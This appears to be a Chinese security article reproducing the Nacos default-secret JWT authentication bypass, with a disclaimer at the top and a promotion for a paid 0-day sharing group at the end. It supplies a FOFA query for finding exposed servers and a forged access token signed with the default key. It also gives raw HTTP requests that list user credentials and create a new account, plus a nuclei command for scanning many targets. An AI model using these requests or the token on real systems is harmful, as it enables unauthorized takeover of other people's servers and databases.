<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zO3P4KLIgfThf9_dZRlqzg)

**0x01 阅读须知**

**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

**0x02 漏洞描述**

Nacos 能让您从微服务平台建设的视角管理数据中心的所有服务及元数据, 包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略。Nacos 平台在默认配置下未对 token.secret.key 进行修改，攻击者通过漏洞可以获取服务器数据库 / OSS 等权限。![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49zcXNWXGz5PuwxvRvWUdPTVEqxp8JgMl8vk0vXKciaARMNxgBQpAc0h8txJuxs7ImoEmWJyol8OBTA/640?wx_fmt=png)

**0x03 漏洞复现**

**fofa：app="NACOS"**

1. 使用 POC 和默认密钥查看当前用户名和密码

```
GET /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9 HTTP/1.1
Host: \{\{Hostname\}\}
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Connection: close
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT
Upgrade-Insecure-Requests: 1
accessToken: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49zcXNWXGz5PuwxvRvWUdPTViaMRWykicDcIQIibTGt0ibicPn2wLaoCFnZ9cKic0cnfyaJgTZtwGsicOpFyQ/640?wx_fmt=png)

2. 利用默认密钥，添加 hellonacos 用户密码为 hellonacos，创建成功

```
POST /nacos/v1/auth/users HTTP/1.1
Host: \{\{Hostname\}\}
User-Agent: Mozilla/5.0 
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ 
Accept-Encoding: gzip, deflate 
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
username=hellonacos&password=hellonacos

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49zcXNWXGz5PuwxvRvWUdPTVGpRqIeiaMicHKfVfv1HWaV1X1GHerASibqnTphgJYibaCRXPBmTyKhXJXQ/640?wx_fmt=png)

2.nuclei 验证已发表于知识星球

```
nuclei.exe -t Nacos_JWT_Unauthorized.yaml -l subs.txt -stats

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49zcXNWXGz5PuwxvRvWUdPTVicbjphLWiaHf7mBLXJAX5rje68Gicqq9yA8PkmyzN6wdkqYugINX9bk5g/640?wx_fmt=png)

**网络安全神兵利器分享**

**网络安全漏洞 N/0day 分享**

 **加入星球请扫描下方二维码，更多精，敬请期待！**

👇👇👇

![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49zs4eNkNzwGvylxKjRnH2aibQqdbEUPicwHRpyuIhk7YdcECWw9kZGCibot3aRDzS4ADTmywx57c7QBw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)